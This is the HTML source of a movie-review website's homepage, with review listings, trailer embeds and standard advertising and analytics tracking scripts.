<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="icon" type="image/png" sizes="32x32" href="http://moviepredators.com/wp-content/themes/moviepredators/images/favicon.png">


	<title>Movie Predators | On the hunt for the latest in Hollywood</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="On the hunt for the latest in Hollywood"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://moviepredators.com/" />
<link rel="next" href="http://moviepredators.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Movie Predators | On the hunt for the latest in Hollywood" />
<meta property="og:description" content="On the hunt for the latest in Hollywood" />
<meta property="og:url" content="http://moviepredators.com/" />
<meta property="og:site_name" content="Movie Predators" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="On the hunt for the latest in Hollywood" />
<meta name="twitter:title" content="Movie Predators | On the hunt for the latest in Hollywood" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/moviepredators.com\/","name":"Movie Predators","potentialAction":{"@type":"SearchAction","target":"http:\/\/moviepredators.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Movie Predators &raquo; Feed" href="http://moviepredators.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Movie Predators &raquo; Comments Feed" href="http://moviepredators.com/comments/feed/" />
<link rel='stylesheet' id='MoviePredators-style-main-css'  href='http://moviepredators.com/wp-content/themes/moviepredators/styles/main.css?ver=4.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='MoviePredators-style-css'  href='http://moviepredators.com/wp-content/themes/moviepredators/style.css?ver=4.8.5' type='text/css' media='all' />
<script type='text/javascript' src='http://moviepredators.com/wp-content/themes/moviepredators/scripts/vendor.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://moviepredators.com/wp-content/themes/moviepredators/scripts/vendor/modernizr.js?ver=4.8.5'></script>
<link rel='https://api.w.org/' href='http://moviepredators.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://moviepredators.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://moviepredators.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.5" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

<!-- GA -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-89253944-2', 'auto');
  ga('send', 'pageview');

</script>

<script type="text/javascript">
  var taboola_account = 'moviepredators';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += 'mt';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += 'mf';
    }
    else {
      taboola_account += 'mr';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += 'dt';
    }
    else {
      taboola_account += 'dr';
    }
  }
  else if (taboola_platform == 'tablet') {
      taboola_account += 't';
  }

  
  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KCVRMHC');</script>
<!-- End Google Tag Manager --><script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sekindo: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},springserve: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.95;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.9;}}};</script>
	<script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/MP/prebid.js" async></script>

  <script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });


    pbjs.que.push(function() {
		pbjs.setPriceGranularity({
			"buckets" : [{
				"precision": 2,
				"min" : 0,
				"max" : 3,
				"increment" : 0.01
			},
				{
					"precision": 2,
					"min" : 3,
					"max" : 5,
					"increment" : 0.05
				},
				{
					"precision": 2,
					"min" : 5,
					"max" : 10,
					"increment" : 0.1
				},
				{
					"precision": 2,
					"min" : 10,
					"max" : 30,
					"increment" : 0.5
				}]
		});
        pbjs.addAdUnits(adUnits);
        pbjs.setConfig({
            userSync: {
                syncEnabled: true,
                iframeEnabled: true,
                syncDelay: 3000
            }
        });
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

	pbjs.que.push(function() {
	    pbjs.enableAnalytics({
	        provider: 'cmv2'
	    });
	});


    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);

  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
					googletag.defineSlot('/87909099/mp-desktop-low', [728, 90], 'ad_pos_mp-desktop-low').addService(googletag.pubads());
			googletag.defineSlot('/87909099/mp-desktop-top', [728, 90], 'ad_pos_mp-desktop-top').addService(googletag.pubads());
			googletag.defineOutOfPageSlot('/87909099/mp-edge', 'ad_pos_mp-edge').addService(googletag.pubads());
//			googletag.defineSlot('/87909099/mp-eof-top', [[468, 60], [728, 90], [300, 250]], 'ad_pos_mp-eof-top').addService(googletag.pubads());
			googletag.defineSlot('/87909099/mp-rr-atf', [300, 250], 'ad_pos_mp-rr-atf').addService(googletag.pubads());
			googletag.defineSlot('/87909099/mp-rr-btf', [300, 250], 'ad_pos_mp-rr-btf').addService(googletag.pubads());
			googletag.defineSlot('/87909099/mp-rr-mid', [[300, 600], [300, 250]], 'ad_pos_mp-rr-mid').addService(googletag.pubads());
			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>

</head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>

<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KCVRMHC"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
	Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
	your experience.</p>
<![endif]-->

<header id="top_header">
	<nav class="navbar navbar-default navbar-fixed-top" id="top_nav">
		<div class="container">
			<!-- Brand and toggle get grouped for better mobile display -->
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false" aria-controls="navbar-collapse-1">
					<span class="sr-only">Toggle navigation</span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
				</button>
				<a class="navbar-brand" href="http://moviepredators.com">
											<img
							src="http://moviepredators.com/wp-content/themes/moviepredators/images/logo.png"
							alt="Movie Predators"
							class="logo-image img-responsive">
									</a>
			</div>

			<!-- Collect the nav links, forms, and other content for toggling -->
			<div class="collapse navbar-collapse navbar-left" id="navbar-collapse-1">
				<div class="flex-wrap">
					<ul id="menu-main-menu" class="nav navbar-nav"><li id="menu-item-203" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-203"><a title="Movie Reviews" href="http://moviepredators.com/category/movie-reviews/">Movie Reviews</a></li>
<li id="menu-item-204" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-204"><a title="Movie Articles" href="http://moviepredators.com/category/movie-articles/">Movie Articles</a></li>
<li id="menu-item-322" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-322"><a title="Actors" href="http://moviepredators.com/category/actor-profiles/">Actors</a></li>
</ul>				</div>
			</div><!-- /.navbar-collapse -->
			<div class="skew-block"></div>
		</div><!-- /.container-fluid -->

	</nav>
</header>







<div id="slider">
	<div id="carouselSR" class="carousel slide">
				<!-- Indicators -->
		<div class="carousel-indicators hidden-xs hidden-sm">

							<a data-slide-index="0" href=""></a>
								<a data-slide-index="1" href=""></a>
								<a data-slide-index="2" href=""></a>
								<a data-slide-index="3" href=""></a>
						</div>
		<!-- Indicators -->

		<!-- Modals -->
									<!-- MODAL -->
				<div class="modal fade" id="modal-video-1114" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
									<span aria-hidden="true">&times;</span>
								</button>
							</div>
							<div class="modal-body">
								<div class="modal-video">
									<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/VyHV0BRtdxo?feature=oembed" frameborder="0" gesture="media" allowfullscreen></iframe></div>								</div>
							</div>
						</div>
					</div>
				</div><!-- MODAL -->
								<!-- MODAL -->
				<div class="modal fade" id="modal-video-1111" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
									<span aria-hidden="true">&times;</span>
								</button>
							</div>
							<div class="modal-body">
								<div class="modal-video">
									<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/Om_HyEy-yog?feature=oembed" frameborder="0" gesture="media" allowfullscreen></iframe></div>								</div>
							</div>
						</div>
					</div>
				</div><!-- MODAL -->
								<!-- MODAL -->
				<div class="modal fade" id="modal-video-1108" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
									<span aria-hidden="true">&times;</span>
								</button>
							</div>
							<div class="modal-body">
								<div class="modal-video">
									<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/wvwVkllXT80?feature=oembed" frameborder="0" gesture="media" allowfullscreen></iframe></div>								</div>
							</div>
						</div>
					</div>
				</div><!-- MODAL -->
								<!-- MODAL -->
				<div class="modal fade" id="modal-video-1105" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
									<span aria-hidden="true">&times;</span>
								</button>
							</div>
							<div class="modal-body">
								<div class="modal-video">
									<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/mfmrPu43DF8?feature=oembed" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe></div>								</div>
							</div>
						</div>
					</div>
				</div><!-- MODAL -->
						<!-- /Modals -->

		<div class="carousel-inner" role="listbox">
																							<div class="item">
						<a href="http://moviepredators.com/movie-reviews/fantasy/harry-potter-sorcerers-stone-review/" class="slider_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/13103214/hp-sorcerers-stone.jpeg')"></a>
						<div class="slider_item_content_wrap">

							<div class="slider_item_content">
								<div class="slider_item_head">
									<h2 class="slider_item_header">
										<a href="http://moviepredators.com/movie-reviews/fantasy/harry-potter-sorcerers-stone-review/">Harry Potter and the Sorcerer’s Stone | ⭐⭐⭐</a>
									</h2>
									<span class="icon icon-vertical-line"></span>
									<div class="slider_item_meta">From Feb 12</div>
								</div>
								<a  href="http://moviepredators.com/movie-reviews/fantasy/harry-potter-sorcerers-stone-review/" class="slider_item_text">Release Date: 16 November 2001 (USA)
Cast: Daniel Radcliffe, Emma Watson, Rupert Grint, Alan Rickman, Richard Harris
Rating: PG
Running Time: 2hr 32min
...</a>
								<div class="slider_item_link">
									<span class="slider_item_link_trailer"><span class="icon icon-youtube"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-1114">Trailer</a></span>
									<span class="slider_item_link_info"><span class="icon icon-info"></span><a href="http://moviepredators.com/movie-reviews/fantasy/harry-potter-sorcerers-stone-review/">Read more</a></span>
								</div>
							</div>

						</div>
					</div>
																									<div class="item">
						<a href="http://moviepredators.com/movie-reviews/comedy/inbetweeners-movie-review/" class="slider_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/13100514/inbetweeners.jpg')"></a>
						<div class="slider_item_content_wrap">

							<div class="slider_item_content">
								<div class="slider_item_head">
									<h2 class="slider_item_header">
										<a href="http://moviepredators.com/movie-reviews/comedy/inbetweeners-movie-review/">The Inbetweeners Movie | ⭐⭐⭐</a>
									</h2>
									<span class="icon icon-vertical-line"></span>
									<div class="slider_item_meta">From Feb 10</div>
								</div>
								<a  href="http://moviepredators.com/movie-reviews/comedy/inbetweeners-movie-review/" class="slider_item_text">Release Date: 17 August 2011 (UK)
Cast: James Buckley, Simon Bird, Blake Harrison, Joe Thomas
Rating: R
Running Time: 1hr 37min

https://www.youtube.com/watch?v=Om_HyEy-yog...</a>
								<div class="slider_item_link">
									<span class="slider_item_link_trailer"><span class="icon icon-youtube"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-1111">Trailer</a></span>
									<span class="slider_item_link_info"><span class="icon icon-info"></span><a href="http://moviepredators.com/movie-reviews/comedy/inbetweeners-movie-review/">Read more</a></span>
								</div>
							</div>

						</div>
					</div>
																									<div class="item">
						<a href="http://moviepredators.com/movie-reviews/comedy/little-miss-sunshine-review/" class="slider_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/13093952/lmshed.jpg')"></a>
						<div class="slider_item_content_wrap">

							<div class="slider_item_content">
								<div class="slider_item_head">
									<h2 class="slider_item_header">
										<a href="http://moviepredators.com/movie-reviews/comedy/little-miss-sunshine-review/">Little Miss Sunshine | ⭐⭐⭐⭐⭐</a>
									</h2>
									<span class="icon icon-vertical-line"></span>
									<div class="slider_item_meta">From Feb 8</div>
								</div>
								<a  href="http://moviepredators.com/movie-reviews/comedy/little-miss-sunshine-review/" class="slider_item_text">Release Date: 18 August 2006 (USA)
Cast: Greg Kinnear, Toni Collette, Alan Arkin, Steve Carell, Paul Dano, Abigail Breslin
Rating: R
Running Time: 1hr 41min
...</a>
								<div class="slider_item_link">
									<span class="slider_item_link_trailer"><span class="icon icon-youtube"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-1108">Trailer</a></span>
									<span class="slider_item_link_info"><span class="icon icon-info"></span><a href="http://moviepredators.com/movie-reviews/comedy/little-miss-sunshine-review/">Read more</a></span>
								</div>
							</div>

						</div>
					</div>
																									<div class="item">
						<a href="http://moviepredators.com/movie-reviews/action/hunger-games-review/" class="slider_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/13090545/hunger-games.jpg')"></a>
						<div class="slider_item_content_wrap">

							<div class="slider_item_content">
								<div class="slider_item_head">
									<h2 class="slider_item_header">
										<a href="http://moviepredators.com/movie-reviews/action/hunger-games-review/">The Hunger Games | ⭐⭐⭐</a>
									</h2>
									<span class="icon icon-vertical-line"></span>
									<div class="slider_item_meta">From Feb 6</div>
								</div>
								<a  href="http://moviepredators.com/movie-reviews/action/hunger-games-review/" class="slider_item_text">Release Date: 23 March 2012 (USA)
Cast: Jennifer Lawrence, Woody Harrelson, Donald Sutherland, Elizabeth Banks, Liam Hemsworth
Rating: PG-13
Running Time: 2hr 22min
...</a>
								<div class="slider_item_link">
									<span class="slider_item_link_trailer"><span class="icon icon-youtube"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-1105">Trailer</a></span>
									<span class="slider_item_link_info"><span class="icon icon-info"></span><a href="http://moviepredators.com/movie-reviews/action/hunger-games-review/">Read more</a></span>
								</div>
							</div>

						</div>
					</div>
							</div>
	</div><!-- /.carousel -->
</div>
<div class="ads_rectangle">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="ads_rectangle_wrap">
					<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
					<!-- MP Homepage 728x90 -->
					<ins class="adsbygoogle"
						 style="display:inline-block;width:728px;height:90px"
						 data-ad-client="ca-pub-9146243825510118"
						 data-ad-slot="7012079589"></ins>
					<script>
						(adsbygoogle = window.adsbygoogle || []).push({});
					</script>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="top_picks_ids">
	<div class="container">
		<h2 class="main_header">Top Picks </h2>
		<div class="row">
																		<div class="col-sm-12 col-md-4 popular_news_top_item_block">
						<div class="popular_news_top_item">
							<a href="http://moviepredators.com/movie-reviews/comedy/mike-and-dave-need-wedding-dates-review/">
								<div class="popular_news_top_item_content">
									<h2 class="popular_news_top_item_header">Mike and Dave Need Wedding Dates | ⭐⭐⭐</h2>
									<p class="popular_news_top_item_meta">
										<span class="popular_news_top_item_meta_name">Rebecca Walton</span>
										|
										<span class="popular_news_top_item_meta_date">2. 4. 18</span>
									</p>
								</div>
								<div class="popular_news_top_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/12101906/mike-and-dave-need-wedding-dates-df-03101_rgb-h_2016-380x222.jpg')"></div>
								<div class="popular_news_top_item_read_more_wrap">
									<div class="popular_news_top_item_read_more">
										read more
										<div class="icon icon_rm"></div>
									</div>
								</div>
							</a>

						</div>

					</div>

																				<div class="col-sm-12 col-md-4 popular_news_top_item_block">
						<div class="popular_news_top_item">
							<a href="http://moviepredators.com/movie-reviews/drama/50-50/">
								<div class="popular_news_top_item_content">
									<h2 class="popular_news_top_item_header">50/50 | ⭐⭐⭐⭐⭐</h2>
									<p class="popular_news_top_item_meta">
										<span class="popular_news_top_item_meta_name">Jacob Reeds</span>
										|
										<span class="popular_news_top_item_meta_date">2. 2. 18</span>
									</p>
								</div>
								<div class="popular_news_top_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/12091543/50-50-12-380x222.jpg')"></div>
								<div class="popular_news_top_item_read_more_wrap">
									<div class="popular_news_top_item_read_more">
										read more
										<div class="icon icon_rm"></div>
									</div>
								</div>
							</a>

						</div>

					</div>

					
			<div class="col-sm-12 col-md-4 hidden-sm hidden-xs popular_news_top_ads_block">
				<div class="ads_square">
	<div class="ads_square_wrap">
		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
		<!-- MP Homepage 300x250 -->
		<ins class="adsbygoogle"
			 style="display:inline-block;width:300px;height:250px"
			 data-ad-client="ca-pub-9146243825510118"
			 data-ad-slot="5535346383"></ins>
		<script>
			(adsbygoogle = window.adsbygoogle || []).push({});
		</script>
	</div>
</div>
			</div>
		</div>
	</div>
</div>

<div class="top_movies_top">
	<div class="container">
		<h2 class="main_header">Editor's Choice</h2>
		<div class="row">
																		<div class="col-xs-12 col-md-4">
						<div class="top_movies_top_item">
							<div class="top_movies_top_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/10/12085551/TheBoss-380x265.jpg')"></div>
							<div class="top_movies_top_item_wrap_content">
								<div class="top_movies_top_item_content">
									<h2 class="top_movies_top_item_header">
										<a href="http://moviepredators.com/movie-reviews/comedy/the-boss-review/">The Boss | ⭐⭐⭐</a></h2>
									<p class="top_movies_top_item_meta">
										<span class="top_movies_top_item_meta_name">Monica Nelson</span>
									</p>
									<div class="top_movies_top_item_link">
										<span class="top_movies_top_item_link_trailer"><span class="icon icon-youtube_white"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-1085">Trailer</a></span>
										<span class="top_movies_top_item_link_info"><span class="icon icon-info_white"></span><a href="http://moviepredators.com/movie-reviews/comedy/the-boss-review/">Read more</a></span>
									</div>
								</div>
							</div>
						</div>
					</div>
					<!-- MODAL -->
					<div class="modal fade" id="modal-video-1085" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
						<div class="modal-dialog" role="document">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
										<span aria-hidden="true">&times;</span>
									</button>
								</div>
								<div class="modal-body">
									<div class="modal-video">
										<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/yakeigyf0vc?feature=oembed" frameborder="0" gesture="media" allowfullscreen></iframe></div>									</div>
								</div>
							</div>
						</div>
					</div><!-- MODAL -->
																				<div class="col-xs-12 col-md-4">
						<div class="top_movies_top_item">
							<div class="top_movies_top_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/06/21132350/A-Nightmare-On-Elm-Street--380x265.png')"></div>
							<div class="top_movies_top_item_wrap_content">
								<div class="top_movies_top_item_content">
									<h2 class="top_movies_top_item_header">
										<a href="http://moviepredators.com/movie-reviews/nightmare-elm-street-movie-reviews/">A Nightmare on Elm Street | ⭐⭐⭐⭐⭐</a></h2>
									<p class="top_movies_top_item_meta">
										<span class="top_movies_top_item_meta_name">Max Gorman</span>
									</p>
									<div class="top_movies_top_item_link">
										<span class="top_movies_top_item_link_trailer"><span class="icon icon-youtube_white"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-44">Trailer</a></span>
										<span class="top_movies_top_item_link_info"><span class="icon icon-info_white"></span><a href="http://moviepredators.com/movie-reviews/nightmare-elm-street-movie-reviews/">Read more</a></span>
									</div>
								</div>
							</div>
						</div>
					</div>
					<!-- MODAL -->
					<div class="modal fade" id="modal-video-44" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
						<div class="modal-dialog" role="document">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
										<span aria-hidden="true">&times;</span>
									</button>
								</div>
								<div class="modal-body">
									<div class="modal-video">
										<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/dCVh4lBfW-c?feature=oembed" frameborder="0" gesture="media" allowfullscreen></iframe></div>									</div>
								</div>
							</div>
						</div>
					</div><!-- MODAL -->
																				<div class="col-xs-12 col-md-4">
						<div class="top_movies_top_item">
							<div class="top_movies_top_item_img" style="background-image: url('http://d2fd8be07w33ep.cloudfront.net/wp-content/uploads/2017/06/21141638/Buffy-The-Vampire-380x265.jpg')"></div>
							<div class="top_movies_top_item_wrap_content">
								<div class="top_movies_top_item_content">
									<h2 class="top_movies_top_item_header">
										<a href="http://moviepredators.com/movie-reviews/buffy-vampire-slayer-movie-review/">Buffy the Vampire Slayer | ⭐⭐</a></h2>
									<p class="top_movies_top_item_meta">
										<span class="top_movies_top_item_meta_name">Jacob Reeds</span>
									</p>
									<div class="top_movies_top_item_link">
										<span class="top_movies_top_item_link_trailer"><span class="icon icon-youtube_white"></span><a href="javascript:void(0)" class="launch-modal" data-modal-id="modal-video-71">Trailer</a></span>
										<span class="top_movies_top_item_link_info"><span class="icon icon-info_white"></span><a href="http://moviepredators.com/movie-reviews/buffy-vampire-slayer-movie-review/">Read more</a></span>
									</div>
								</div>
							</div>
						</div>
					</div>
					<!-- MODAL -->
					<div class="modal fade" id="modal-video-71" tabindex="-1" role="dialog" aria-labelledby="modal-video-label">
						<div class="modal-dialog" role="document">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
										<span aria-hidden="true">&times;</span>
									</button>
								</div>
								<div class="modal-body">
									<div class="modal-video">
										<div class="embed-responsive embed-responsive-16by9"><iframe src="https://www.youtube.com/embed/5fBDiiJT4ck?feature=oembed" frameborder="0" gesture="media" allowfullscreen></iframe></div>									</div>
								</div>
							</div>
						</div>
					</div><!-- MODAL -->
							</div>
	</div>
